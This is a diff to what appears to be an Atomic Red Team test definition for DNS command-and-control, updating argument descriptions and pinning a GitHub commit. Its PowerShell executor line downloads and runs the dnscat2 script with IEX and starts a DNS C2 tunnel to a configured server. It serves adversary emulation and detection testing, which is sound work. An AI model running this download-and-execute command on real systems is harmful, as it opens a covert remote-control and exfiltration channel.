@@ -172,16 +172,16 @@ atomic_tests:
     - windows
   input_arguments:
     domain:
-      description: Domain hosting DNS Sserver
+      description: Domain Name configured to use DNS Server where your C2 listener is running
       type: string
       default: example.com
     server_ip:
-      description: IP for DNS Sserver
+      description: IP address of DNS server where your C2 listener is running
       type: string
       default: 127.0.0.1
   executor:
     name: powershell
     elevation_required: false
     command: |
-      IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
+      IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
       Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
